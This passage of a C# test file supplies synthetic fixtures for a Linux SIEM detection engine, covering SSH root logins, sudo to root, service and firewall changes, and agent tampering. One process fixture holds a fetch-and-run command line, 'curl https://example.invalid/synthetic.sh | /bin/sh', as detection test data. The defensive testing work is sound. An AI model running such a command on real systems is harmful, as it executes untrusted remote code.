            LinuxJournalEvent(LinuxTelemetrySourceIds.Ssh, "authentication", "authenticate", "success", sourceIp: "192.0.2.10", targetUser: "synthetic-user"),
            LinuxTelemetrySourceIds.Ssh);
        yield return ("auth.success-after-failures.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.Ssh, "authentication", "authenticate", "success", sourceIp: "192.0.2.10", targetUser: "synthetic-user"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.Ssh, "authentication", "authenticate", "failure", sourceIp: "192.0.2.10", targetUser: "synthetic-user"),
            LinuxTelemetrySourceIds.Ssh);
        yield return ("privilege.sudo-su-root.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.Privilege, "authorization", "command_execute", "success", user: "synthetic-user", targetUser: "root", commandLine: "/usr/bin/id --synthetic"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.Privilege, "authorization", "command_execute", "success", user: "synthetic-user", targetUser: "synthetic-admin", commandLine: "/usr/bin/id --synthetic"),
            LinuxTelemetrySourceIds.Privilege);
        yield return ("ssh.root-login.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.Ssh, "authentication", "authenticate", "success", sourceIp: "192.0.2.20", targetUser: "root"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.Ssh, "authentication", "authenticate", "success", sourceIp: "192.0.2.20", targetUser: "synthetic-user"),
            LinuxTelemetrySourceIds.Ssh);
        yield return ("process.suspicious-privileged-command.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.Privilege, "authorization", "command_execute", "success", user: "synthetic-user", targetUser: "root", commandLine: "/usr/bin/curl https://example.invalid/synthetic.sh"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.Privilege, "authorization", "command_execute", "success", user: "synthetic-user", targetUser: "root", commandLine: "/usr/bin/id --synthetic"),
            LinuxTelemetrySourceIds.Privilege);
        yield return ("process.suspicious-snapshot-command.linux",
            PassiveProcessEvent("observed", "/usr/bin/curl https://example.invalid/synthetic.sh | /bin/sh"),
            PassiveProcessEvent("observed", "/usr/bin/curl https://example.invalid/synthetic.tar -o /tmp/synthetic.tar"),
            LinuxTelemetrySourceIds.ProcessSnapshotDiff);
        yield return ("persistence.service-start.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.ServiceChange, "service", "service_start", "success", serviceName: "synthetic.service"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.ServiceChange, "service", "service_stop", "success", serviceName: "synthetic.service"),
            LinuxTelemetrySourceIds.ServiceChange);
        yield return ("persistence.scheduler-activity.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.Scheduler, "scheduler", "timer_trigger", "success", serviceName: "synthetic.timer"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.Scheduler, "scheduler", "job_ignored", "success", serviceName: "synthetic.timer"),
            LinuxTelemetrySourceIds.Scheduler);
        yield return ("package.change.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.PackageManagement, "package", "install", "success", packageName: "synthetic-package"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.PackageManagement, "package", "query", "success", packageName: "synthetic-package"),
            LinuxTelemetrySourceIds.PackageManagement);
        yield return ("kernel.security-control-change.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.KernelSecurity, "kernel_security", "module_load", "success", serviceName: "synthetic-module"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.KernelSecurity, "kernel_security", "heartbeat", "success", serviceName: "synthetic-module"),
            LinuxTelemetrySourceIds.KernelSecurity);
        yield return ("policy.security-posture-drift.linux",
            PortableEvent(EventSources.InventoryDiff, LinuxTelemetrySourceIds.PolicyPostureDrift, "policy_drift", new NormalizedEventFields { Category = "policy_posture", Action = "drift", Outcome = "success" }),
            PortableEvent(EventSources.InventoryDiff, LinuxTelemetrySourceIds.PolicyPostureDrift, "policy_baseline", new NormalizedEventFields { Category = "policy_posture", Action = "baseline", Outcome = "success" }),
            LinuxTelemetrySourceIds.PolicyPostureDrift);
        yield return ("firewall.change.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.Firewall, "firewall", "policy_change", "success", sourceIp: "192.0.2.30", destinationIp: "198.51.100.30", destinationPort: "22"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.Firewall, "firewall", "status", "success", sourceIp: "192.0.2.30", destinationIp: "198.51.100.30", destinationPort: "22"),
            LinuxTelemetrySourceIds.Firewall);
        yield return ("network.listener-observed.linux",
            PassiveListenerEvent("0.0.0.0", "8443", "observed"),
            PassiveListenerEvent("127.0.0.1", "8443", "observed"),
            LinuxTelemetrySourceIds.NetworkSocketSnapshotDiff);
        yield return ("behavior.host-resource-pressure.linux",
            HostMetricsEvent(new { cpu_busy_permille = 950 }),
            HostMetricsEvent(new { cpu_busy_permille = 949 }),
            LinuxTelemetrySourceIds.HostBehaviourMetrics);
        yield return ("tamper.agent-log-source-silence.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.AgentLogTamper, "tamper", "log_corruption", "failure"),
            LinuxJournalEvent(LinuxTelemetrySourceIds.AgentLogTamper, "tamper", "agent_status", "success"),
            LinuxTelemetrySourceIds.AgentLogTamper);
        yield return ("tamper.agent-self-integrity.linux",
            PortableEvent(EventSources.InventoryDiff, "linux-agent-self-integrity-snapshot", "agent_self_integrity_change", new NormalizedEventFields { Category = "tamper", Action = "agent_integrity_change", Outcome = "success", FilePath = "/opt/challenger-siem-agent/Challenger.Siem.LinuxAgent", Hash = new string('a', 64) }),
            PortableEvent(EventSources.InventoryDiff, "linux-agent-self-integrity-snapshot", "inventory_observed", new NormalizedEventFields { Category = "inventory", Action = "observed", Outcome = "success", FilePath = "/opt/challenger-siem-agent/Challenger.Siem.LinuxAgent" }),
            "linux-agent-self-integrity-snapshot");
    }

    private static DetectionEvaluationResult PassiveRuleResult(
        DetectionEngine engine,
        EventEnvelope envelope,
        IReadOnlyDictionary<string, SourceHealthReport> health,
        string ruleId) => Assert.Single(engine.EvaluateLinux(envelope, health), result => result.Rule.RuleId == ruleId);

    private static EventEnvelope PassiveProcessEvent(string action, string commandLine) =>
        PortableEvent(
            EventSources.InventoryDiff,
            LinuxTelemetrySourceIds.ProcessSnapshotDiff,
            $"process_{action}",
            new NormalizedEventFields
            {
                Category = "process",
                Action = action,
                Outcome = "unknown",
                ProcessId = "4242",
                ParentProcessId = "41",
                ProcessImage = "/usr/bin/synthetic-shell",
                ProcessCommandLine = commandLine,
                Process = new ProcessTelemetryConcept
                {
                    Pid = "4242",
                    ParentPid = "41",
                    Executable = "/usr/bin/synthetic-shell",
                    CommandLine = commandLine
                }
            });

    private static EventEnvelope PassiveListenerEvent(
        string address,
        string port,
        string action,
        string category = "network_listener")
    {
        var nestedPort = int.TryParse(port, out var parsedPort) ? parsedPort : (int?)null;
        return PortableEvent(
            EventSources.InventoryDiff,
            LinuxTelemetrySourceIds.NetworkSocketSnapshotDiff,
            $"socket_{action}",
            new NormalizedEventFields
            {
                Category = category,
                Action = action,
                Outcome = "unknown",
                SourceIp = address,
                SourcePort = port,
                Protocol = "tcp",
                Network = new NetworkTelemetryConcept
                {
                    SourceIp = address,
                    SourcePort = nestedPort,
                    Protocol = "tcp"
                }
            });
    }

    private static EventEnvelope HostMetricsEvent(object raw, string action = "sampled") =>
        PortableEvent(
            EventSources.AgentHealth,
            LinuxTelemetrySourceIds.HostBehaviourMetrics,
            "host_metrics_sample",
            new NormalizedEventFields
            {
                Category = "host_behavior",
                Action = action,
                Outcome = "success",
                Labels = new Dictionary<string, string>(StringComparer.Ordinal)
                {
                    ["evidence_mode"] = "coalesced_procfs_sample"
                }
            }) with
        {
            Raw = JsonSerializer.SerializeToElement(raw)
        };

    private static IReadOnlyDictionary<string, SourceHealthReport> HealthySources(string sourceId, string status = SourceHealthStatuses.Healthy) =>
        new Dictionary<string, SourceHealthReport>(StringComparer.OrdinalIgnoreCase)
        {
            [sourceId] = new SourceHealthReport
            {
                SourceId = sourceId,
                Status = status,
                PrerequisiteStatuses = new Dictionary<string, string>(StringComparer.Ordinal) { ["synthetic_prerequisite"] = SourceEvidenceStatuses.Satisfied },
                EventFamilyStatuses = new Dictionary<string, string>(StringComparer.Ordinal) { ["synthetic_family"] = SourceEvidenceStatuses.Observed },
                Details = new Dictionary<string, string>(StringComparer.Ordinal)
            }
        };

    private static EventEnvelope L4RoleCollisionEvent(
        string roleSourceId,
        string roleFamily,
        string category,
        string action,
        string outcome,
        string secondarySourceId,
        string secondaryFamily,
        string? sourceIp = null,
        string? targetUser = null,
        string? commandLine = null,
        string? serviceName = null) =>
        LinuxJournalEvent(
            roleSourceId,
            category,
            action,
            outcome,
            sourceIp: sourceIp,
            targetUser: targetUser,
            commandLine: commandLine,
            serviceName: serviceName,
            normalized: new NormalizedEventFields
            {
                Category = category,
                Action = action,
                Outcome = outcome,
                SourceIp = sourceIp,
                TargetUserName = targetUser,
                ProcessCommandLine = commandLine,
                Process = commandLine is null ? null : new ProcessTelemetryConcept { CommandLine = commandLine },
                ServiceName = serviceName,
                Labels = new Dictionary<string, string>(StringComparer.Ordinal)
                {
                    ["linux.event_family"] = roleFamily,
                    ["linux.secondary_source_id"] = secondarySourceId,
                    ["linux.secondary_event_family"] = secondaryFamily
                }
            });

    private static EventEnvelope WithCollisionLabels(
        EventEnvelope envelope,
        string primaryFamily,
        string? secondarySource,
        string? secondaryFamily)
    {
        var labels = new Dictionary<string, string>(StringComparer.Ordinal)
        {
            ["linux.event_family"] = primaryFamily
        };
        if (secondarySource is not null)
        {
            labels["linux.secondary_source_id"] = secondarySource;
        }
        if (secondaryFamily is not null)
        {
            labels["linux.secondary_event_family"] = secondaryFamily;
        }

        return envelope with { Normalized = envelope.Normalized! with { Labels = labels } };
    }

    private static EventEnvelope LinuxJournalEvent(
        string sourceId,
        string category,
        string action,
        string outcome,
        DateTimeOffset? eventTime = null,
        string? sourceIp = null,
        string? destinationIp = null,
        string? destinationPort = null,
        string? user = null,
        string? targetUser = null,
        string? commandLine = null,
        string? serviceName = null,
        string? packageName = null,
        NormalizedEventFields? normalized = null)
    {
        normalized ??= new NormalizedEventFields
        {
            Category = category,
            Action = action,
            Outcome = outcome,
            UserName = user,
            TargetUserName = targetUser,
            SourceIp = sourceIp,
            DestinationIp = destinationIp,
            DestinationPort = destinationPort,
            Protocol = destinationPort is null ? null : "tcp",
            ProcessCommandLine = commandLine,
            Process = commandLine is null ? null : new ProcessTelemetryConcept { CommandLine = commandLine },
            ServiceName = serviceName,
            PackageName = packageName
        };

        return PortableEvent(EventSources.LinuxJournal, sourceId, action, normalized, eventTime);
    }

    private static EventEnvelope PortableEvent(
        string source,
        string sourceId,
        string eventCode,
        NormalizedEventFields normalized,
        DateTimeOffset? eventTime = null) => new()
        {
            EventId = Guid.NewGuid(),
            AgentId = "linux-detection-agent",
            Hostname = "SYNTHETIC-LINUX-01",
            Platform = TelemetryPlatforms.Linux,
            Source = source,
            SourceId = sourceId,
            EventCode = eventCode,
            EventTime = eventTime ?? DateTimeOffset.UtcNow,
            Severity = normalized.Outcome == "failure" ? "audit_failure" : "information",
            Message = "Synthetic Linux detection fixture.",
            Normalized = normalized,
            Raw = JsonSerializer.SerializeToElement(new { synthetic = true, source_id = sourceId, event_code = eventCode })
        };

    private static async Task InsertLinuxAgentAsync(NpgsqlDataSource dataSource, string agentId, string hostname)
    {
        await using var command = dataSource.CreateCommand("""
            insert into agents(agent_id, hostname, machine_guid, os_version, agent_version, api_token_hash, platform, host_id)
            values(@agent_id, @hostname, null, 'Synthetic Linux', '1.2.0-test', 'synthetic-hash', 'linux', @host_id)
            on conflict(agent_id) do nothing;
            """);
        command.Parameters.AddWithValue("agent_id", agentId);
        command.Parameters.AddWithValue("hostname", hostname);
        command.Parameters.AddWithValue("host_id", $"{agentId}-host");
        await command.ExecuteNonQueryAsync();
    }

    private static async Task EnableDetectionRuleAsync(NpgsqlDataSource dataSource, string ruleId, int version)
    {
        await using var command = dataSource.CreateCommand("""
            insert into detection_rule_management(rule_id, version, enabled, lifecycle_state, validation_status, tuning_notes, suppression_notes, settings_version)
            values(@rule_id, @version, true, 'active', 'synthetic_passed', '', '', 1)
            on conflict(rule_id, version) do update
            set enabled = true,
                lifecycle_state = 'active',
                validation_status = 'synthetic_passed',
                updated_at = now(),
                settings_version = detection_rule_management.settings_version + 1;
            """);
        command.Parameters.AddWithValue("rule_id", ruleId);
        command.Parameters.AddWithValue("version", version);
        await command.ExecuteNonQueryAsync(CancellationToken.None);
    }

    private static async Task StoreHealthyHeartbeatAsync(NpgsqlDataSource dataSource, string agentId, string hostname, string sourceId)
    {
        var entry = LinuxTelemetrySourceCatalog.Find(sourceId) ?? LinuxTelemetrySourceCatalog.L2Security[0];
        var report = new SourceHealthReport
        {
            SourceId = sourceId,
            DisplayName = entry.DisplayName,
            Platform = TelemetryPlatforms.Linux,
            SourceKind = entry.SourceKind,
            SourceNamespace = entry.SourceNamespace,
            Applicability = SourceApplicabilityStatuses.Applicable,
            CoverageLevel = entry.CoverageLevel,
            Status = SourceHealthStatuses.Healthy,
            Required = true,
            Enabled = true,
            Requirement = entry.Requirement,
            LastEventTime = DateTimeOffset.UtcNow,
            ObservedAt = DateTimeOffset.UtcNow,
            PrerequisiteStatuses = entry.Prerequisites.ToDictionary(item => item, _ => SourceEvidenceStatuses.Satisfied, StringComparer.Ordinal),
            EventFamilyStatuses = entry.EventFamilies.ToDictionary(item => item, _ => SourceEvidenceStatuses.Observed, StringComparer.Ordinal),
            CollectedCheckpoint = new SourceCheckpoint { Cursor = "s=synthetic-detection;i=1", RecordedAt = DateTimeOffset.UtcNow },
            AcknowledgedCheckpoint = new SourceCheckpoint { Cursor = "s=synthetic-detection;i=1", RecordedAt = DateTimeOffset.UtcNow },
            Details = new Dictionary<string, string>(StringComparer.Ordinal)
        };
        await new HeartbeatRepository(dataSource).InsertHeartbeatAsync(new HeartbeatRequest
        {
            AgentId = agentId,
            Hostname = hostname,
            AgentVersion = "1.2.0-test",
            Os = "Synthetic Linux",
            Platform = TelemetryPlatforms.Linux,
            HostId = $"{agentId}-host",
            QueueDepth = 0,
            SourceHealth = [report]
        }, CancellationToken.None);
    }

    private static async Task<string> CreateSelfIntegrityRootAsync()
    {
        var root = Path.Combine(Path.GetTempPath(), $"challenger-api-self-integrity-{Guid.NewGuid():N}");
        Directory.CreateDirectory(Path.Combine(root, "opt/challenger-siem-agent"));
        Directory.CreateDirectory(Path.Combine(root, "etc/systemd/system"));
        Directory.CreateDirectory(Path.Combine(root, "etc/challenger-siem-agent"));
        Directory.CreateDirectory(Path.Combine(root, "var/lib/challenger-siem-agent"));
        await File.WriteAllTextAsync(Path.Combine(root, "opt/challenger-siem-agent/Challenger.Siem.LinuxAgent"), "synthetic-binary");
        await File.WriteAllTextAsync(Path.Combine(root, "etc/systemd/system/challenger-siem-agent.service"), "[Service]\nUser=challenger-siem\n");
        await File.WriteAllTextAsync(Path.Combine(root, "etc/challenger-siem-agent/agentsettings.json"), "{\"ApiToken\":\"synthetic-secret\"}");
        return root;
    }

    private static string RepositoryFile(params string[] parts)
    {
        var current = new DirectoryInfo(AppContext.BaseDirectory);
        while (current is not null)
        {
            var candidate = Path.Combine(new[] { current.FullName }.Concat(parts).ToArray());
            if (File.Exists(candidate))
            {
                return candidate;
            }
            current = current.Parent;
        }
        throw new FileNotFoundException($"Could not locate repository file: {string.Join('/', parts)}");
    }
}
